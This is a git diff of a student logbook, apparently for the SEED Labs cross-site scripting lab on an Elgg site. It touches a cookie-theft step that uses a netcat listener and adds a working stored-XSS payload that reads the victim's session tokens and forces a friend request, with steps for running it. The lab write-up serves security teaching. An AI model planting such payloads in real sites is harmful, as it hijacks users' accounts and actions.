@@ -103,7 +103,7 @@ Annalysing these two images, we can check how the printed cookies are different 
 
 1. Prepare the payload.
     - As described above, our goal is to listen to the cookies being sent through the server upon a request. This is only possible if the client uses a `GET` method. Therefore, we shall input a malicious image tag, as images are always fetched using the `GET`method.
-    - 
+  
     - We will use the payload 
   
         ```html
@@ -119,10 +119,10 @@ Annalysing these two images, we can check how the printed cookies are different 
     <figcaption><strong>Fig 7. </strong>Entering the payload in the input field</figcaption>
 </figure>
 
-2. Save the changes and head to the profile.
+1. Save the changes and head to the profile.
     - This time, no modal will be shown. Instead, an invalid photo will be displayed and a request will be sent to the server.
 
-3. Listen to the response to our request.
+2. Listen to the response to our request.
     - In a console, we will run the command `nc -lknv 5555`. 
     - This is a `netcat` command with the flags 
       - `-l`, to listen to the connection, like a man in the middle; 
@@ -146,3 +146,70 @@ Annalysing these two images, we can check how the printed cookies are different 
 <br>
 
 ## Task 4 : Becoming the Victim’s Friend
+
+Our goal for this task is to automatically add the victim user as our friend when they visit our profile.
+
+1. Prepare the payload
+    - The lab for this task gives us the following JavaScript skeleton:
+        ```js
+        <script type="text/javascript">
+            window.onload = function () {
+                var Ajax=null;
+
+                var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; #1
+                var token="&__elgg_token="+elgg.security.token.__elgg_token; #2
+
+                //Construct the HTTP request to add Samy as a friend.
+                var sendurl= "http://www.seed-server.com/action/friends/add?friend=57&__elgg_ts"; //FILL IN
+
+                //Create and send Ajax request to add friend
+                Ajax=new XMLHttpRequest();
+                Ajax.open("GET", sendurl, true);
+                Ajax.send();
+            }
+        </script>
+        ```
+
+        Questions: 
+
+      1. The line marked with #1 and #2 are used to store the logged in user's security tokens. We need these values in order to prove the request's authenticity.
+
+      2. The editor mode writes HTML to the page. If we couldn't access the "Edit HTML" editor on the Edit Profile menu, we could still use the command `curl` in the console to execute a successful attack or use the browser's console and write JavaScript altering the innerHTML property in order to change any HTML value.
+
+    - Using the "HTTP Header Live" add-on on Firefox, we can see that, when we go to Boby's profile and add him as a friend (we're logged in as Alice), the following HTTP request is sent to the server: `http://www.seed-server.com/action/friends/add?friend=57&__elgg_ts=1670412977&__elgg_token=sl0pVxZjMMt-vqH8EvQ4fw`
+
+    <figure>
+        <img src="images/logbook10/task4/1.png" alt="Adding Boby as a friend" width="50%" />
+        <figcaption><strong>Fig 10. </strong>Adding Boby as a friend</figcaption>
+    </figure>
+
+   - Filling in the skeleton JavaScript with the correct link, using the variables given, we get the following payload:
+
+        ```js
+        <script type="text/javascript">
+            window.onload = function () {
+                var Ajax=null;
+
+                var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; 
+                var token="&__elgg_token="+elgg.security.token.__elgg_token; 
+
+                //Construct the HTTP request to add Samy as a friend.
+                var sendurl= "http://www.seed-server.com/action/friends/add?friend=56" + ts + token;
+
+                //Create and send Ajax request to add friend
+                Ajax=new XMLHttpRequest();
+                Ajax.open("GET", sendurl, true);
+                Ajax.send();
+            }
+        </script>
+        ```
+
+2. Execute the attack
+   - Add the payload to the "About Me" section in Alice's profile.
+   - Log in as Boby and go to Alice's profile. You will be added as a friend without any alert being displayed.
+
+  <figure>
+      <img src="images/logbook10/task4/2.png" alt="Alice added as Boby's friend" width="50%" />
+      <figcaption><strong>Fig 10. </strong>Alice added as Boby's friend</figcaption>
+  </figure>
+
